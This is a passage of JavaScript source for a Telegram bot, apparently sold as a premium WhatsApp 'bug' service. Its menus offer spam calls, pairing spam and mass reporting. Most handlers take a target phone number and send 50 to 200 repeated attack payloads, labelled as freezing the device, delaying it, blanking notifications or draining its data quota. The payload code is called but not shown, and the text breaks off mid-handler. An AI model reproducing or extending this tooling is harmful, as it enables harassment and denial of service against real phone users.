    
    else if (data === "owner_menu") {
      selectedImage = "https://g.top4top.io/p_3788ghdlv1.jpg"; // Ganti dengan link foto menu owner
      caption = `<blockquote><strong>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 <tg-emoji emoji-id="6165775219580472827">☠</tg-emoji></strong></blockquote>
⎔ Developer  : @Pinnxzy <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
⎔ Version    : 1.0 Gen 3 <tg-emoji emoji-id="6219549292458150316">🔥</tg-emoji>
⎔ Platform   : Telegram <tg-emoji emoji-id="5330237710655306682">📱</tg-emoji> 
⎔ Language : Javascript <tg-emoji emoji-id="5370577035636786019">📱</tg-emoji>
⎔ type script : Bebas spam bugs & No Spam

<blockquote><strong>╔─═⊱ AKSES OWNER</strong></blockquote>
│/addadmin
║/deladmin
│/addprem 
║/delprem
│/setcd 
║/addsender
│/listbot
┗━━━━━━━━━━━━━━⬡
`;
  replyMarkup = {
  inline_keyboard: [
    [{ text: "  Admin Menu", callback_data: "Admin_menu", icon_custom_emoji_id: "5116582462276764538",  style: "danger" }],
    [{ text: " ⎋メインコース", callback_data: "back_to_main", icon_custom_emoji_id: "6039539366177541657", style: "danger" }]],
    };
  }  
    
    else if (data === "Admin_menu") {
      selectedImage = "https://g.top4top.io/p_3788ghdlv1.jpg"; // Ganti dengan link foto menu owner
      caption = `<blockquote><strong>𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 <tg-emoji emoji-id="6165775219580472827">☠</tg-emoji></strong></blockquote>
⎔ Developer  : @Pinnxzy <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
⎔ Version    : 1.0 Gen 3 <tg-emoji emoji-id="6219549292458150316">🔥</tg-emoji>
⎔ Platform   : Telegram <tg-emoji emoji-id="5330237710655306682">📱</tg-emoji> 
⎔ Language : Javascript <tg-emoji emoji-id="5370577035636786019">📱</tg-emoji>
⎔ type script : Bebas spam bugs & No Spam

<blockquote><strong>╔─═⊱ AKSES ADMIN</strong></blockquote>
│/addprem
║/delprem
│/setcd
║/addsender
│/listbot
┗━━━━━━━━━━━━━━━⬡
`;
      replyMarkup = {
        inline_keyboard: [[{ text: "⎋メインコース", callback_data: "back_to_main",  icon_custom_emoji_id: "6039539366177541657", style : "primary" }]],
      };
    } 
    
    else if (data === "tqto") {
      selectedImage = "https://g.top4top.io/p_3788ghdlv1.jpg"; // Ganti dengan link foto menu Tools 
      caption = `<blockquote><strong>
╔─═⊱ 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> ─═⬡
║⎔ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : Xyzen Official <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
║⎔ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 :  Pinzy Official <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
║⎔ 𝗙𝗿𝗶𝗲𝗻𝗱 : saka <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
║⎔ 𝗙𝗿𝗶𝗲𝗻𝗱 : Nexi <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
║⎔ 𝗙𝗿𝗶𝗲𝗻𝗱 : Errstore <tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
║⎔ 𝗙𝗿𝗶𝗲𝗻𝗱 : Yanz <tg-emoji emoji-id="6003719416238315324">🔇</tg-emoji>
║⎔ 𝗙𝗿𝗶𝗲𝗻𝗱 : Vinz <tg-emoji emoji-id="6003719416238315324">🔇</tg-emoji>
║⎔ 𝗢𝘄𝗻𝗲𝗿 : Palzz <tg-emoji emoji-id="6003719416238315324">🔇</tg-emoji>
║⎔ 𝗦𝘂𝗽𝗽𝗼𝗿𝘁 : Takashi <tg-emoji emoji-id="6003719416238315324">🔇</tg-emoji>
║⎔ 𝗦𝘂𝗽𝗽𝗼𝗿𝘁 : Badzzne <tg-emoji emoji-id="6003719416238315324">🔇</tg-emoji>
║⎔ 𝗦𝘂𝗽𝗽𝗼𝗿𝘁 : AsepX7 <tg-emoji emoji-id="6003719416238315324">🔇</tg-emoji>
┗━━━━━━━━━━━━━⬡</strong></blockquote>
`;
      replyMarkup = {
        inline_keyboard: [[{ text: " ⎋メインコース", callback_data: "back_to_main", icon_custom_emoji_id: "6039539366177541657", style : "primary" }]],
      };
    } 
      
    else if (data === "buysc") {
      selectedImage = "https://g.top4top.io/p_3788ghdlv1.jpg"; // Ganti dengan link foto menu Tools 
      caption = `<blockquote><strong>
╔─═⊱ 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐒͢𝐇͢𝐎͢𝐏 ─═⬡
║
║─── [ 𝗜𝗡𝗦𝗧𝗥𝗨𝗞𝗦𝗜 ] ───
║
║ Silahkan ketik perintah :
║ ➥ /buysc
║
║ Untuk melakukan pembelian
║ secara otomatis.
║
╚━━━━━━━━━━━━━⎔</strong></blockquote>
`;
      replyMarkup = {
        inline_keyboard: [[{ text: " ⎋メインコース", callback_data: "back_to_main", style : "primary" }]],
      };
    } 
    
    else if (data === "updatesc") {
      selectedImage = "https://g.top4top.io/p_3788ghdlv1.jpg"; // Ganti dengan link foto menu Tools 
      caption = `<blockquote><strong>
╔═══〔 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 〕═══⎔
║
║  📢  𝗦𝗬𝗦𝗧𝗘𝗠 𝗨𝗣𝗗𝗔𝗧𝗘
║
║  Silahkan ketik perintah:
║  ➥ <code>/update</code>
║  ➥ <code>/autoupdate</code>
║
║  Proses pembaruan script
║  akan berjalan otomatis.
║
╚═════════════════════⎔</strong></blockquote>
`;
      replyMarkup = {
        inline_keyboard: [[{ text: " ⎋メインコース", callback_data: "back_to_main", style : "primary" }]],
      };
    } 
    
    else if (data === "tols") {
      selectedImage = "https://g.top4top.io/p_3788ghdlv1.jpg"; // Ganti dengan link foto menu Tools 
      caption = `<blockquote><strong>
╔─═⊱ 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄 <tg-emoji emoji-id="6165775219580472827">☠</tg-emoji>─═⬡
║⎔ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : @Pinnxzy<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji>
║⎔ Version    : 1.0 Gen 3 <tg-emoji emoji-id="6219549292458150316">🔥</tg-emoji>
║⎔ Platform   : Telegram <tg-emoji emoji-id="5330237710655306682">📱</tg-emoji> 
║⎔ 𝗦𝘁𝗮𝘁𝘂𝘀 : Private series
┗━━━━━━━━━━━━━⬡</strong></blockquote>
<blockquote><strong>╔─═⊱ TOOLS  MENU
║/SpamPairing
│/SpamCall
║/hapusbug
│/check
│/SpamReportWhatsapp
┗━━━━━━━━━━━━━━━⬡</strong></blockquote>
<blockquote><strong>╔─═⊱ FUN MENU
│/tourl
│/tofotolive
│/cekemoji
│/brat
┗━━━━━━━━━━━━━━━⬡</strong></blockquote>
`;
      replyMarkup = {
        inline_keyboard: [[{ text: " ⎋メインコース", callback_data: "back_to_main", icon_custom_emoji_id: "6039539366177541657", style : "primary" }]],
      };
    } 
    
    else if (data === "back_to_main") {
      await sendStartMenu(chatId, query.from);
      return await bot.answerCallbackQuery(query.id);
    }

    if (caption !== "" && selectedImage !== "") {
      await bot.sendPhoto(chatId, selectedImage, {
        caption: caption,
        parse_mode: "HTML",
        reply_markup: replyMarkup
      });
    }

    await bot.answerCallbackQuery(query.id);
});

//=======CASE BUG=========//

bot.onText(/\/Trolling(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Trolling 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendPhoto(chatId, randomImage, {
      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Delay Hard
▹ Status : Success
▹ Date : ${date}</blockquote>`,
      parse_mode: "HTML", 
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

    setTimeout(async () => {
      try {

        for (let i = 0; i < 200; i++) {
          await X7Nganceng(sock, target, x = false);
          await sleep(1500)
        }

        console.log(`[SUCCESS] Trolling ${formattedNumber}`)

      } catch (err) {
        console.log("Trolling error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Trolling ERROR:", err)
  }
});

bot.onText(/\/Novaria(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Novaria 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendPhoto(chatId, randomImage, {
      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Delay Hard Invis
▹ Status : Success
▹ Date : ${date}</blockquote>`,
      parse_mode: "HTML", 
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

    setTimeout(async () => {
      try {

        for (let i = 0; i < 200; i++) {
          await X7DelayHard(sock, target);
          await sleep(1500)
        }

        console.log(`[SUCCESS] Novaria ${formattedNumber}`)

      } catch (err) {
        console.log("Novaria error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Nebula ERROR:", err)
  }
});

bot.onText(/\/Nebula(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Nebula 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendPhoto(chatId, randomImage, {
      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Delay Hard Invisible 
▹ Status : Success
▹ Date : ${date}</blockquote>`,
      parse_mode: "HTML", 
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

    setTimeout(async () => {
      try {

        for (let i = 0; i < 200; i++) {
          await X7Delay(sock, target);
          await sleep(1500)
        }

        console.log(`[SUCCESS] Nebula ${formattedNumber}`)

      } catch (err) {
        console.log("Nebula error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Nebula ERROR:", err)
  }
});

bot.onText(/\/Supernova(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Supernova 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendPhoto(chatId, randomImage, {
      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Delay Visible Hard 
▹ Status : Success
▹ Date : ${date}</blockquote>`,
      parse_mode: "HTML", 
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

    setTimeout(async () => {
      try {

        for (let i = 0; i < 5; i++) {
          await delayvisible(sock, target);
          await sleep(1500)
        }

        console.log(`[SUCCESS] Supernova ${formattedNumber}`)

      } catch (err) {
        console.log("Supernova error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Supernova ERROR:", err)
  }
});

bot.onText(/\/Ovalium(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/pinzyoffc" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Ovalium 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendPhoto(chatId, randomImage, {
      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Delay Sedot Kouta
▹ Status : Success
▹ Date : ${date}</blockquote>`,
      parse_mode: "HTML", 
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

    setTimeout(async () => {
      try {

        for (let i = 0; i < 100; i++) {
          await dingleyhard(sock, target, ptcp = true);
          await sleep(1500)
        }

        console.log(`[SUCCESS] Ovalium ${formattedNumber}`)

      } catch (err) {
        console.log("Ovalium error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Ovalium ERROR:", err)
  }
});

bot.onText(/\/Slowness(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Slowness 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendPhoto(chatId, randomImage, {
      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Delay Sedot KoutaV2
▹ Status : Success
▹ Date : ${date}</blockquote>`,
      parse_mode: "HTML", 
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

    setTimeout(async () => {
      try {

        for (let i = 0; i < 100; i++) {
          await bulldozerX(sock, target);
          await sleep(1500)
        }

        console.log(`[SUCCESS] SLOWNESS ${formattedNumber}`)

      } catch (err) {
        console.log("Slowness error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Slowness ERROR:", err)
  }
});

bot.onText(/\/Slowness(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Slowness 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendPhoto(chatId, randomImage, {
      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Delay Sedot KoutaV3
▹ Status : Success
▹ Date : ${date}</blockquote>`,
      parse_mode: "HTML", 
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

    setTimeout(async () => {
      try {

        for (let i = 0; i < 100; i++) {
          await X7Bulldozer(sock, target);
          await sleep(1500)
        }

        console.log(`[SUCCESS] Zombiee ${formattedNumber}`)

      } catch (err) {
        console.log("Zombiee error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Zombiee ERROR:", err)
  }
});


bot.onText(/\/Dior(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Dior 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendPhoto(chatId, randomImage, {
      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Ui System
▹ Status : Success
▹ Date : ${date}</blockquote>`,
      parse_mode: "HTML", 
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

    setTimeout(async () => {
      try {

        for (let i = 0; i <50; i++) {
          await button(sock, target);
          await sleep(1500)
        }

        console.log(`[SUCCESS] Dior ${formattedNumber}`)

      } catch (err) {
        console.log("Dior error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Dior ERROR:", err)
  }
});

bot.onText(/\/Darkness(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Darkness 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendPhoto(chatId, randomImage, {
      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Blank Notif + Freeze 
▹ Status : Success
▹ Date : ${date}</blockquote>`,
      parse_mode: "HTML", 
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

    setTimeout(async () => {
      try {

        for (let i = 0; i <50; i++) {
          await X7Blank(target);
          await sleep(1500)
        }

        console.log(`[SUCCESS] Darkness ${formattedNumber}`)

      } catch (err) {
        console.log("Darkness error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Darkness ERROR:", err)
  }
});

bot.onText(/\/Xiosr(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/Pinnxzy" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Xiosr 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendPhoto(chatId, randomImage, {
      caption: `<blockquote>⬡═—⊱「 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄<tg-emoji emoji-id="6003746869669270383">✅</tg-emoji> 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Blank Click
▹ Status : Success
